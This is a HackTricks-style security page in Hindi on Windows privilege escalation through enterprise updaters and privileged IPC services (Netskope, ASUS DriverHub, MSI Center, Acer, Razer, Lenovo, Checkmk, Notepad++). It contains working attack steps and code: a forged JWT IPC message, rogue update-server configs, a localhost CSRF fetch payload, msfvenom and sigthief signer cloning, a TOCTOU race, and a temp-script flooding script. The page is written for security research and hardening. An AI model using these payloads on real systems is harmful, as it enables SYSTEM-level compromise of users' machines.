# Enterprise Auto-Updaters और Privileged IPC का दुरुपयोग (जैसे Netskope, ASUS और MSI)

{{#include ../../banners/hacktricks-training.md}}

यह पेज Windows local privilege escalation chains के एक वर्ग का सामान्यीकृत विवरण देता है। ये chains enterprise endpoint agents और updaters में पाए जाते हैं, जो आसानी से उपयोग की जा सकने वाली IPC surface और privileged update flow उपलब्ध कराते हैं। इसका एक प्रतिनिधि उदाहरण Windows के लिए Netskope Client < R129 (CVE-2025-0309) है, जिसमें low-privileged user enrollment को attacker-controlled server पर भेजने के लिए बाध्य कर सकता है और फिर malicious MSI भेज सकता है, जिसे SYSTEM service इंस्टॉल करती है।<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

ऐसे ही उत्पादों के विरुद्ध दोबारा इस्तेमाल किए जा सकने वाले मुख्य विचार:
- Re-enrollment या reconfiguration को attacker server पर भेजने के लिए बाध्य करने हेतु privileged service के localhost IPC का दुरुपयोग करें।
- Vendor के update endpoints लागू करें, rogue Trusted Root CA भेजें, और updater को malicious, “signed” package पर point करें।
- कमजोर signer checks (CN allow-lists), optional digest flags और lax MSI properties से बच निकलें।
- यदि IPC “encrypted” है, तो registry में मौजूद world-readable machine identifiers से key/IV derive करें।
- यदि service callers को image path/process name के आधार पर प्रतिबंधित करती है, तो allow-listed process में inject करें या किसी process को suspended अवस्था में शुरू करें और minimal thread-context patch के ज़रिए अपनी DLL bootstrap करें।

Custom local TCP services की identity और input boundaries की भी समीक्षा करें, भले ही उन्हें PIN या किसी अन्य application credential की आवश्यकता हो। Listener को उसके process और effective service account से जोड़ें, फिर exact deployed binary/version की जाँच करें और देखें कि caller-controlled fields को fixed buffers में copy करने या child-process command बनाने से पहले उनकी length जाँची जाती है या नहीं। [Microsoft की buffer-overrun guidance](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) बताती है कि privileged native code में unchecked external input ख़तरनाक क्यों है। Loopback listener, hardcoded credential या केवल process name से memory corruption या SYSTEM execution साबित नहीं होता; reachability, authorization, code path और mitigations अलग-अलग शर्तें हैं। नियमित enumeration को passive रखें; live service को crash-length inputs न भेजें।

---
## 1) localhost IPC के ज़रिए enrollment को attacker server पर भेजने के लिए बाध्य करना

कई agents में user-mode UI process होता है, जो localhost TCP पर JSON का उपयोग करके SYSTEM service से बात करता है।

Netskope में देखा गया:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसा JWT enrollment token बनाएँ जिसके claims backend host (जैसे AddonUrl) को नियंत्रित करते हों। alg=None का उपयोग करें, ताकि signature की आवश्यकता न हो।
2) अपनी JWT और tenant name के साथ provisioning command चलाने वाला IPC message भेजें:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Service enrollment/config के लिए आपके rogue server से संपर्क करना शुरू कर देती है, जैसे:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट:
- यदि caller verification path/name-based है, तो अनुरोध किसी allow-listed vendor binary से शुरू करें (देखें §4)।<sup>[[1]](#references)[[2]](#references)</sup>

### Network-exposed management IPC

यह trust boundary हमेशा localhost तक सीमित नहीं होती। रिपोर्ट किए गए MyReport Updater 2.1.1 मामले में, एक `LocalSystem` service सभी interfaces पर सुन रही थी और reference host, port और operating mode में बिना authentication के gRPC configuration change स्वीकार कर रही थी। Remote variant के लिए listener तक network access और service से चुने गए reference तक outbound access, दोनों आवश्यक थे। इनका आकलन इस बात से अलग करें कि बाद का package flow file-write boundary को पार कर सकता है या नहीं।<sup>[[16]](#references)</sup>

---
## 2) Update channel को hijack करके SYSTEM के रूप में code चलाना

जब client आपके server से बात करने लगे, तो अपेक्षित endpoints लागू करें और उसे attacker MSI की ओर मोड़ें। सामान्य क्रम:

1) /v2/config/org/clientconfig → बहुत कम updater interval वाला JSON config लौटाएँ, जैसे:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate लौटाएँ। Service इसे Local Machine Trusted Root store में install करती है।
3) /v2/checkupdate → Malicious MSI और fake version की ओर संकेत करने वाला metadata दें।

दुनिया में आम तौर पर दिखने वाले checks को bypass करना:
- Signer CN allow-list: Service शायद केवल यह जाँचती हो कि Subject CN “netSkope Inc” या “Netskope, Inc.” के बराबर है। आपका rogue CA इस CN वाला leaf जारी करके MSI पर sign कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम की benign MSI property शामिल करें। Install के समय कोई enforcement नहीं होता।
- Optional digest enforcement: config flag (जैसे, check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देता है।

नतीजा: SYSTEM service
C:\ProgramData\Netskope\stAgent\data\*.msi
से आपका MSI install करती है और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute करती है।<sup>[[1]](#references)[[2]](#references)</sup>

Patch-bypass से सीख: अगर vendor update source को cryptographically authenticate करने के बजाय कुछ “trusted” domains को allow-list करके जवाब देता है, तो vendor के अपने redirectors या reverse proxies खोजें, जिनसे आप अब भी traffic को अपनी ओर steer कर सकते हैं। Netskope के मामले में, बाद की public research ने दिखाया कि R129-era allow-list को अब भी `rproxy.goskope.com` के ज़रिए abuse किया जा सकता था, जो attacker-controlled Azure App Service content को proxy करता था। Hostname allow-lists को trust boundary नहीं, बल्कि speed bump मानें।<sup>[[14]](#references)</sup>

एक अन्य failure mode है **self-consistent लेकिन unauthenticated package metadata**। MyReport मामले में, attacker-controlled reference से modified archive serve किया गया, जबकि एक intermediary ने updater तक पहुँचने से पहले vendor के MD5 digest और size responses बदल दिए। उन values का मेल response consistency जाँचता था, vendor origin नहीं; MD5 collision की ज़रूरत नहीं थी। Caller द्वारा चुनी गई installation directory ने privileged extraction को file-write boundary बना दिया। इससे मिलने वाला DLL-loading primitive [arbitrary file write को DLL hijacking में chain करना](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack) के अंतर्गत बताया गया है।<sup>[[16]](#references)</sup>

---
## 3) Encrypted IPC requests को forge करना (जहाँ मौजूद हों)

R127 से, Netskope ने IPC JSON को encryptData field में wrap किया, जो Base64 जैसा दिखता है। Reverse engineering से पता चला कि AES की key/IV ऐसे registry values से derive होती हैं जिन्हें कोई भी user पढ़ सकता है:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption को reproduce कर सकते हैं और standard user से valid encrypted commands भेज सकते हैं।<sup>[[1]](#references)[[2]](#references)</sup> सामान्य सुझाव: अगर कोई agent अचानक अपने IPC को “encrypt” करने लगे, तो HKLM में device IDs, product GUIDs और install IDs को material के रूप में खोजें।

---
## 4) IPC caller allow-lists को bypass करना (path/name checks)

कुछ services TCP connection के PID को resolve करके और image path/name की तुलना Program Files के अंतर्गत मौजूद allow-listed vendor binaries (जैसे, stagentui.exe, bwansvc.exe, epdlp.exe) से करके peer को authenticate करने की कोशिश करती हैं।

Bypass करने के दो व्यावहारिक तरीके:
- किसी allow-listed process (जैसे, nsdiag.exe) में DLL injection करें और उसी के भीतर से IPC proxy करें।
- किसी allow-listed binary को suspended अवस्था में spawn करें और driver-enforced tamper rules को संतुष्ट करने के लिए CreateRemoteThread के बिना अपनी proxy DLL bootstrap करें (§5 देखें)।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Tamper-protection के अनुकूल injection: suspended process + NtContinue patch

Products अक्सर protected processes के handles से खतरनाक rights हटाने के लिए minifilter/OB callbacks driver (जैसे, Stadrv) के साथ आते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: अधिकारों को THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

इन सीमाओं का पालन करने वाला एक भरोसेमंद user-mode loader:
1) CREATE_SUSPENDED के साथ किसी vendor binary का CreateProcess करें।
2) वे handles प्राप्त करें जिनकी आपको अब भी अनुमति है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और THREAD_GET_CONTEXT/THREAD_SET_CONTEXT वाला thread handle (या केवल THREAD_RESUME, यदि आप code को ज्ञात RIP पर patch करते हैं)।
3) ntdll!NtContinue (या किसी अन्य शुरुआती, निश्चित रूप से mapped thunk) को एक छोटे stub से overwrite करें, जो आपके DLL path पर LoadLibraryW call करे और फिर वापस jump करे।
4) In-process अपने stub को trigger करने और अपना DLL load करने के लिए ResumeThread करें।

क्योंकि आपने पहले से protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का इस्तेमाल नहीं किया (आपने उसे खुद create किया), इसलिए driver की policy पूरी होती है।<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) व्यावहारिक tooling
- NachoVPN (Netskope plugin) rogue CA, malicious MSI signing और ज़रूरी endpoints serve करने की प्रक्रिया automate करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate।<sup>[[3]](#references)</sup>
- UpSkope एक custom IPC client है, जो arbitrary (वैकल्पिक रूप से AES-encrypted) IPC messages तैयार करता है और allow-listed binary से शुरुआत करने के लिए suspended-process injection भी शामिल करता है।<sup>[[4]](#references)</sup>

## 7) अज्ञात updater/IPC surfaces के लिए तेज़ triage workflow

किसी नए endpoint agent या motherboard “helper” suite की जाँच करते समय, एक quick workflow आम तौर पर यह पता लगाने के लिए पर्याप्त होता है कि क्या आपके सामने privesc का एक संभावनाशील target है:<sup>[[6]](#references)</sup>

1) Loopback listeners की सूची बनाएँ और उन्हें vendor processes से जोड़ें:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) संभावित named pipes की सूची बनाएं:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Plugin-based IPC servers द्वारा उपयोग किए जाने वाले registry-आधारित routing data को निकालें:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) पहले user-mode client से endpoint names, JSON keys और command IDs निकालें। Packed Electron/.NET frontends अक्सर पूरा schema leak कर देते हैं:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) वास्तविक trust predicate की तलाश करें, न कि केवल उस code path की जो अंततः process लॉन्च करता है:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

जिन पैटर्न को प्राथमिकता देना उचित है:
- `CryptQueryObject`/certificate parsing बिना `WinVerifyTrust` के आमतौर पर यह संकेत देता है कि “certificate exists” को “certificate is trusted” मान लिया गया, जिससे certificate cloning या अन्य fake-signer tricks संभव होते हैं।
- `Origin`, `Referer`, download URLs, process names या signer CNs पर substring/suffix checks authentication नहीं हैं। `contains(".vendor.com")` आमतौर पर attacker-controlled lookalike domains के ज़रिए exploitable होता है।
- अगर low-privileged GUI यह तय करता है कि “the file is trusted” और SYSTEM broker केवल उस नतीजे का उपयोग करता है, तो client-side DLL/JS को patch या reimplement करके पूरी boundary bypass की जा सकती है (Razer-style split validation)।
- अगर broker payload को `%TEMP%`/`C:\Windows\Temp` में copy करता है और फिर उसी path से validate या schedule करता है, तो तुरंत TOCTOU replacement windows और ऐसे sibling plugin modules की जाँच करें जो कमज़ोर checks वाले alternate `ExecuteTask()` wrappers देते हैं।<sup>[[6]](#references)</sup>

Named-pipe-heavy targets के लिए, protocol को गहराई से reverse करने से पहले कमज़ोर DACLs और remotely reachable pipes पहचानने का PipeViewer एक तेज़ तरीका है।<sup>[[11]](#references)</sup>

अगर target callers को केवल PID, image path या process name के आधार पर authenticate करता है, तो इसे boundary के बजाय एक speed bump मानें: legitimate client में inject करना या allow-listed process से connection बनाना अक्सर server के checks को संतुष्ट करने के लिए पर्याप्त होता है। विशेष रूप से named pipes के लिए, [client impersonation और pipe abuse पर यह पेज](named-pipe-client-impersonation.md) इस primitive को अधिक विस्तार से समझाता है।

एक privileged **cleanup या restore broker** के लिए, pipe ACL के साथ-साथ path trust boundary की भी जाँच करें। कम-privileged caller, shared directory में restore destination चुनने या staged backup artifact का नाम बदलने में सक्षम हो सकता है, भले ही service executable और उसका install directory सुरक्षित हों। अलग-अलग पुष्टि करें कि caller restore command तक पहुँच सकता है, exact staged input या filename को modify कर सकता है, broker higher identity के तहत चलता है, और उसका restore operation वास्तव में चुने गए protected path पर लिखता है। Writable staging directory या readable pipe अकेले arbitrary privileged write साबित नहीं करते; destination mapping और service behavior की code review या नियंत्रित testing ज़रूरी है। Passive enumeration के दौरान कोई अज्ञात cleanup command न चलाएँ, क्योंकि इससे user files delete हो सकती हैं।

---
## 8) केवल vendor signatures से authenticated modular add-in brokers (Lenovo Vantage pattern)

एक नया variation जिस पर ध्यान देना चाहिए, वह है **signed-client RPC broker**: low-privileged Lenovo-signed desktop process, SYSTEM service से बात करता है और service `%ProgramData%` में मौजूद XML-described add-ins के एक सेट को JSON commands भेजती है। किसी भी accepted signed client के **अंदर code execution** मिल जाने पर, हर `runas="system"` contract आपके attack surface का हिस्सा बन जाता है।<sup>[[15]](#references)</sup>

Lenovo Vantage research में देखे गए high-value primitives:
- **Caller पर vendor द्वारा signed होने के कारण भरोसा करना**: researchers ने writable directory में Lenovo-signed EXE copy करके और DLL side-load (`profapi.dll`) पूरा करके authenticated context हासिल किया, जिससे ऐसे client के अंदर arbitrary code चला जिसे service पहले से trusted मानती थी।
- **Manifest-driven attack surface discovery**: add-ins `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` के तहत घोषित होते हैं; कई contracts `SYSTEM` के रूप में चलते हैं, इसलिए इन manifests की enumeration से अक्सर broker को reverse करने की तुलना में वास्तविक privileged verbs जल्दी सामने आते हैं।
- **Authenticated channel के पीछे per-command bugs**: trusted client के अंदर पहुँचने के बाद, public research में update/install verbs में path-traversal + race conditions, privileged settings databases में raw-SQL abuse, और substring-based registry path checks मिले, जिनसे intended hive के बाहर writes संभव हुईं।

Target पर उपयोगी recon:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

व्यावहारिक सीख: जब भी कोई helper suite ऐसा broker उपलब्ध कराता है जो पहले **caller process** को authenticate करता है और उसके बाद ही दर्जनों plugin/add-in commands को dispatch करता है, तो front-door trust check bypass करने के बाद रुकें नहीं। Manifest/contract table dump करें और हर high-privilege verb को अलग-अलग fuzz करें; authenticated channel आम तौर पर दूसरे चरण के कई bugs छिपा देता है।

---
## 1) Privileged HTTP APIs के विरुद्ध Browser-to-localhost CSRF (ASUS DriverHub)

DriverHub, 127.0.0.1:53000 पर एक user-mode HTTP service (ADU.exe) देता है, जो https://driverhub.asus.com से आने वाली browser calls की अपेक्षा करता है। Origin filter, Origin header और `/asus/v1.0/*` से उपलब्ध download URLs पर `string_contains(".asus.com")` करता है। इसलिए `https://driverhub.asus.com.attacker.tld` जैसा कोई भी attacker-controlled host यह check पास कर लेता है और JavaScript से state-changing requests भेज सकता है।<sup>[[6]](#references)</sup> Bypass के और तरीकों के लिए [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) देखें।

व्यावहारिक तरीका:
1) ऐसा domain register करें जिसमें `.asus.com` शामिल हो और उस पर एक malicious webpage host करें।
2) `http://127.0.0.1:53000` पर किसी privileged endpoint (जैसे `Reboot`, `UpdateApp`) को call करने के लिए `fetch` या XHR का उपयोग करें।
3) Handler द्वारा अपेक्षित JSON body भेजें – packed frontend JS में नीचे दिया गया schema दिखता है।

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

नीचे दिखाया गया PowerShell CLI भी सफल होता है, जब Origin header को spoof करके विश्वसनीय मान पर सेट किया जाता है:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

इसलिए attacker की site पर कोई भी browser visit, एक 1-click (या `onload` के ज़रिए 0-click) local CSRF बन जाता है, जो SYSTEM helper को चलाता है।

---
## 2) असुरक्षित code-signing verification और certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` JSON body में बताए गए arbitrary executables डाउनलोड करता है और उन्हें `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp` में cache करता है। Download URL validation में वही substring logic दोबारा इस्तेमाल होता है, इसलिए `http://updates.asus.com.attacker.tld:8000/payload.exe` स्वीकार कर लिया जाता है। Download के बाद, ADU.exe चलाने से पहले सिर्फ़ यह जाँचता है कि PE में signature मौजूद है और Subject string ASUS से मेल खाती है—यहाँ कोई `WinVerifyTrust` या chain validation नहीं होता।

इस flow को weaponize करने के लिए:
1) एक payload बनाएँ (जैसे, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`)।
2) ASUS के signer को उसमें clone करें (जैसे, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`)।
3) `pwn.exe` को `.asus.com` जैसे दिखने वाले domain पर host करें और ऊपर बताए browser CSRF के ज़रिए UpdateApp को trigger करें।

क्योंकि Origin और URL filters दोनों substring-based हैं और signer check सिर्फ़ strings की तुलना करता है, DriverHub attacker binary को अपने elevated context में डाउनलोड करके execute कर लेता है।<sup>[[6]](#references)</sup>

---
## 1) updater के copy/execute paths में TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center की SYSTEM service एक TCP protocol expose करती है, जिसमें हर frame `4-byte ComponentID || 8-byte CommandID || ASCII arguments` होता है। Core component (Component ID `0f 27 00 00`) में `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}` मौजूद है। इसका handler:
1) दिए गए executable को `C:\Windows\Temp\MSI Center SDK.exe` में copy करता है।
2) `CS_CommonAPI.EX_CA::Verify` के ज़रिए signature verify करता है (certificate subject का “MICRO-STAR INTERNATIONAL CO., LTD.” से मेल खाना और `WinVerifyTrust` का सफल होना ज़रूरी है)।
3) एक scheduled task बनाता है, जो attacker के control वाले arguments के साथ temp file को SYSTEM के रूप में चलाता है।

Verification और `ExecuteTask()` के बीच copied file lock नहीं होती। Attacker यह कर सकता है:
- Frame A भेजे, जिसमें एक legitimate MSI-signed binary हो (इससे signature check सफल होता है और task queue हो जाता है)।
- इसे लगातार Frame B messages भेजकर race करे, जिनमें malicious payload का path हो, ताकि verification पूरी होते ही `MSI Center SDK.exe` overwrite हो जाए।

Scheduler के चलने पर, original file verify होने के बावजूद वह overwritten payload को SYSTEM के रूप में execute करता है। भरोसेमंद exploitation के लिए दो goroutines/threads इस्तेमाल करके `CMD_AutoUpdateSDK` को spam करें, जब तक TOCTOU window जीत न जाए।<sup>[[6]](#references)</sup>

---
## 2) custom SYSTEM-level IPC और impersonation का दुरुपयोग (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` द्वारा load किए गए हर plugin/DLL को एक Component ID मिलता है, जो `HKLM\SOFTWARE\MSI\MSI_CentralServer` में stored होता है। Frame के पहले 4 bytes उस component को चुनते हैं, जिससे attackers commands को मनचाहे modules तक route कर सकते हैं।
- Plugins अपने task runners define कर सकते हैं। `Support\API_Support.dll` में `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` मौजूद है और यह **signature validation के बिना** सीधे `API_Support.EX_Task::ExecuteTask()` call करता है—कोई भी local user इसे `C:\Users\<user>\Desktop\payload.exe` पर point करके निश्चित रूप से SYSTEM execution पा सकता है।
- Wireshark से loopback sniff करने या dnSpy में .NET binaries instrument करने पर Component ↔ command mapping जल्दी सामने आ जाती है; फिर custom Go/ Python clients frames को replay कर सकते हैं।<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes और impersonation levels
- `ACCSvc.exe` (SYSTEM) `\\.\pipe\treadstone_service_LightMode` expose करता है, और इसका discretionary ACL remote clients (जैसे, `\\TARGET\pipe\treadstone_service_LightMode`) को अनुमति देता है। File path के साथ command ID `7` भेजने पर service का process-spawning routine invoke होता है।
- Client library args के साथ एक magic terminator byte (113) serialize करती है। Frida/`TsDotNetLib` के साथ dynamic instrumentation (instrumentation के सुझावों के लिए [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) देखें) से पता चलता है कि `CreateProcessAsUser` call करने से पहले native handler इस value को `SECURITY_IMPERSONATION_LEVEL` और integrity SID में map करता है।
- 113 (`0x71`) को 114 (`0x72`) से बदलने पर generic branch चलता है, जो पूरा SYSTEM token बनाए रखता है और high-integrity SID (`S-1-16-12288`) set करता है। इसलिए spawned binary unrestricted SYSTEM के रूप में चलती है—स्थानीय और cross-machine, दोनों तरह से।
- इसे exposed installer flag (`Setup.exe -nocheck`) के साथ इस्तेमाल करके lab VMs पर भी ACC चलाएँ और vendor hardware के बिना pipe की जाँच करें।<sup>[[6]](#references)</sup>

ये IPC bugs दिखाते हैं कि localhost services को mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) क्यों लागू करना चाहिए, और हर module के “run arbitrary binary” helper में समान signer verifications क्यों होनी चाहिए।

---
## 3) कमजोर user-mode validation पर आधारित COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 ने इस परिवार में एक और उपयोगी pattern जोड़ा: कम privileges वाला user COM helper से `RzUtility.Elevator` के ज़रिए process launch करने को कह सकता है, जबकि trust का निर्णय user-mode DLL (`simple_service.dll`) पर छोड़ दिया जाता है, न कि privileged boundary के भीतर मज़बूती से लागू किया जाता है।

देखा गया exploitation path:
- COM object `RzUtility.Elevator` instantiate करें।
- Elevated launch के लिए अनुरोध करने हेतु `LaunchProcessNoWait(<path>, "", 1)` call करें।
- सार्वजनिक PoC में, अनुरोध भेजने से पहले `simple_service.dll` के अंदर PE-signature gate को patch out कर दिया जाता है, जिससे attacker की पसंद का कोई भी executable launch किया जा सकता है।<sup>[[6]](#references)[[10]](#references)</sup>

न्यूनतम PowerShell invocation:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

सामान्य निष्कर्ष: “helper” suites को reverse करते समय, केवल localhost TCP या named pipes तक सीमित न रहें। `Elevator`, `Launcher`, `Updater` या `Utility` जैसे नामों वाली COM classes की जाँच करें, फिर सत्यापित करें कि privileged service खुद target binary को validate करती है या केवल उस नतीजे पर भरोसा करती है जिसकी गणना patch की जा सकने वाली user-mode client DLL करती है। यह pattern Razer से आगे भी लागू होता है: ऐसा कोई भी split design, जिसमें high-privilege broker low-privilege side से मिले allow/deny निर्णय का उपयोग करता है, privesc surface हो सकता है।

---
## MSI repair के दौरान predictable temp script का execution (Checkmk Agent / CVE-2024-0670)

कुछ Windows agents अब भी privileged actions लागू करने के लिए `C:\Windows\Temp` में एक temporary `.cmd` लिखते हैं और उसे `SYSTEM` के रूप में execute करते हैं। अगर filename का अनुमान लगाया जा सकता है और service मौजूदा files को सुरक्षित तरीके से दोबारा नहीं बनाती, तो low-privileged user पहले से भविष्य की temp file को **read-only** बना सकता है और privileged process से अपनी नियंत्रित सामग्री execute करवा सकता है, न कि उसकी अपनी script।

Vulnerable Checkmk Agent builds में देखा गया:
- temp pattern: `cmk_all_<PID>_1.cmd`
- प्रभावित branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: cached agent package का MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

व्यावहारिक workflow:
1. मौजूदा process IDs या चल रहे agent PID से PID की एक यथार्थवादी range का अनुमान लगाएँ।
2. एक छोटी **ASCII** `.cmd` payload लिखें (`Set-Content -Encoding Ascii` या `cmd.exe` redirection का उपयोग करें; batch files के लिए UTF-16 PowerShell output से बचें)।
3. संभावित range में `C:\Windows\Temp\cmk_all_<PID>_1.cmd` की कई copies बनाएँ और हर file को read-only चिह्नित करें।
4. cached MSI का repair trigger करें, ताकि privileged service temp script को फिर से बनाने की कोशिश करे और फिर उसे execute करे।<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

यदि vulnerable product Windows Installer के साथ install किया गया है, तो repair trigger करने से पहले `C:\Windows\Installer` में मौजूद बेतरतीब दिखने वाली cached MSI को उसके product name से map करें:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operational notes:
- `qwinsta` उपयोगी है जब non-interactive WinRM shell से `msiexec /fa` विफल हो जाए और आपको यह समझना हो कि कोई मौजूदा desktop/disconnected session repair को सही तरीके से trigger कर सकता है या नहीं।<sup>[[7]](#references)</sup>
- यह pattern उन दूसरे endpoint agents और updaters पर भी लागू होता है जो **world-writable locations में temp scripts रखते हैं और बाद में उन्हें SYSTEM के रूप में execute करते हैं**। अनुमानित नामों, exclusive create semantics की कमी, और ऐसे repair/update flows की जांच करें जिन्हें मांग पर trigger किया जा सकता हो।

### Interactive installer repair और privileged console

PDF24 Creator 11.15.1 MSI-repair के एक अलग जोखिम का उदाहरण है: इसका printer-install custom action repair के दौरान SYSTEM अधिकारों के साथ एक visible console शुरू कर सकता है। Vendor ने इस व्यवहार को ठीक करने के लिए 11.15.2 में MSI installer बदल दिया। किसी पुराने product version को केवल triage lead मानें। जांचें कि MSI package registered है या पहुंच योग्य है, क्या यह user repair शुरू कर सकता है, क्या vulnerable custom action और log-file delay मौजूद हैं, और क्या interactive desktop console दिखा सकता है। रिपोर्ट किए गए delay में `faxPrnInst.log` पर oplock का उपयोग किया गया था; केवल file writability ही access की एकमात्र शर्त नहीं थी। Non-interactive shell, पहुंच से बाहर package, या patched installer इस chain को तोड़ सकता है। यह समस्या `AlwaysInstallElevated` पर निर्भर नहीं करती और अनुमानित temporary script को replace करने से अलग है।

---
## कमजोर updater validation के जरिए remote supply-chain hijack (WinGUp / Notepad++)

जून 2025 और दिसंबर 2025 के बीच, Notepad++ update flow के पीछे hosting infrastructure को compromise करने वाले attackers ने चुनिंदा victims को malicious manifests भेजे। पुराने WinGUp-आधारित updaters update की authenticity को पूरी तरह verify नहीं करते थे, इसलिए hostile XML response clients को attacker-controlled URLs पर redirect कर सकता था। चूंकि client ने downloaded installer पर trusted certificate chain और valid PE signature—दोनों लागू किए बिना HTTPS content स्वीकार किया, victims ने trojanized NSIS `update.exe` fetch करके execute किया।<sup>[[12]](#references)[[13]](#references)</sup>

Operational flow (किसी local exploit की आवश्यकता नहीं):
1. **Infrastructure interception**: CDN/hosting को compromise करें और update checks के जवाब में ऐसा attacker metadata दें जो malicious download URL की ओर संकेत करे।
2. **Trojanized NSIS**: installer payload fetch/execute करता है और दो execution chains का दुरुपयोग करता है:
   - **अपना signed binary लाकर sideload करना**: signed Bitdefender `BluetoothService.exe` को bundle करें और उसके search path में malicious `log.dll` रखें। Signed binary चलने पर Windows, `log.dll` को sideload करता है; यह DLL Chrysalis backdoor को decrypt करके reflectively load करता है (static detection में बाधा डालने के लिए Warbird-protected + API hashing का उपयोग करके)।
   - **Scripted shellcode injection**: NSIS एक compiled Lua script execute करता है, जो shellcode inject करने और Cobalt Strike Beacon stage करने के लिए Win32 APIs (जैसे `EnumWindowStationsW`) का उपयोग करती है।<sup>[[12]](#references)</sup>

किसी भी auto-updater के लिए hardening/detection के मुख्य बिंदु:
- Downloaded installer का **certificate + signature verification** लागू करें (vendor signer को pin करें, mismatched CN/chain को reject करें) और update manifest पर स्वयं हस्ताक्षर करें (जैसे, XMLDSig)। Manifest-नियंत्रित redirects को validation के बिना block करें।
- **BYO signed binary sideloading** को download के बाद detection pivot मानें: जब signed vendor EXE अपने canonical install path के बाहर से DLL name load करे (जैसे, Bitdefender का Temp/Downloads से `log.dll` load करना), और जब updater temp से non-vendor signatures वाले installers drop/execute करे, तो alert करें।
